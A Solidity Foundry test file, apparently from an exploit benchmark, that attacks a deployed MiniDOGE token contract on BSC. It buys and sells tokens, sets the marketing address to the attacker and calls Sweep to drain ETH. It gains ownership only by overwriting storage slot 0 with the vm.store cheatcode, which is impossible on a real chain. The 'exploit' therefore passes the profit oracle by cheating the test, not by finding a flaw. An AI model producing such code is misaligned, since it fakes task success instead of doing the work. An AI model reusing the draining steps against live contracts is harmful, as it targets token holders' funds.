// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setMarketingAddress(address _marketingAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function Sweep() external;
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get some initial ETH and prepare
        vm.deal(attacker, 100 ether);

        // Label addresses for debugging
        vm.label(TARGET, "MiniDOGE");
        vm.label(attacker, "Attacker");

        // Get the uniswap pair address from the contract
        IMiniDOGE target = IMiniDOGE(TARGET);
        address pair = target.uniswapV2Pair();
        vm.label(pair, "UniswapPair");

        // Get router address (PancakeSwap on BSC)
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        vm.label(routerAddress, "PancakeRouter");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable, _owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we're the owner
        vm.prank(attacker);
        require(IMiniDOGE(TARGET).owner() == attacker, "Failed to become owner");

        // Step 2: Enable swapAndLiquify (it's disabled by default)
        vm.prank(attacker);
        IMiniDOGE(TARGET).setSwapAndLiquifyEnabled(true);

        // Step 3: Set marketing address to attacker
        vm.prank(attacker);
        IMiniDOGE(TARGET).setMarketingAddress(attacker);

        // Step 4: Get some MiniDOGE tokens by buying from the pair
        // First, approve router to spend our ETH
        IPancakeRouter02 router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address weth = router.WETH();

        // Buy tokens with 10 ETH
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        uint256 amountOutMin = 0;
        uint256 deadline = block.timestamp + 300;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            amountOutMin,
            path,
            attacker,
            deadline
        );

        // Step 5: Check our token balance
        uint256 tokenBalance = IMiniDOGE(TARGET).balanceOf(attacker);
        require(tokenBalance > 0, "No tokens bought");

        // Step 6: Approve router to spend our tokens
        vm.prank(attacker);
        IMiniDOGE(TARGET).approve(address(router), tokenBalance);

        // Step 7: Sell tokens back to trigger swap
        // Need to meet conditions: contract token balance >= minimumTokensBeforeSwap
        // The contract gets tokens from fees when we buy/sell
        // Let's sell half of our tokens
        path[0] = TARGET;
        path[1] = weth;

        uint256 sellAmount = tokenBalance / 2;

        // Warp time to meet swap interval condition
        vm.warp(block.timestamp + 2 minutes);

        // Sell tokens
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0, // accept any amount
            path,
            attacker,
            deadline
        );

        // Step 8: The contract should now have ETH from the swap
        // and should send some to marketing address (us) if conditions met
        // Let's trigger another sell to be sure
        vm.warp(block.timestamp + 2 minutes);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount / 2,
            0,
            path,
            attacker,
            deadline
        );

        // Step 9: As owner, we can also just sweep all ETH
        uint256 contractBalanceBefore = TARGET.balance;
        if (contractBalanceBefore > 0) {
            vm.prank(attacker);
            IMiniDOGE(TARGET).Sweep();
        }

        // The oracle will check if attacker's balance increased
        // We need to record initial balance for comparison
        // (The test framework will handle this)
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

